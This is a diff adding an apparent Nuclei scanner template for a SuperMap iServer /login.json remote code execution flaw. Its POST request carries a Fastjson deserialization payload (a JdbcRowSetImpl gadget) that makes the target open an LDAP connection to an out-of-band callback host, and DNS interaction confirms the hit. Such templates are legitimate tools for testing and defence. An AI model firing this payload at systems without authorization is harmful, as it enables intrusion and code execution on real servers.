@@ -1,0 +1,33 @@
+id: poc-yaml-supermap-iser-login-json-rce
+info:
+  name: SuperMap iServer /login.json RCE Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,dnslog
+http:
+  - raw:
+      - |
+        POST /iserver/services/security/login.json HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+        "rasdnd1": {
+            "@type": "java.lang.Class", 
+            "val": "com.sun.rowset.JdbcRowSetImpl"
+        }, 
+        "randfd2": {
+            "@type": "com.sun.rowset.JdbcRowSetImpl", 
+            "dataSourceName": "ldap://{{interactsh-url}}", 
+            "autoCommit": true
+        }
+        }
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
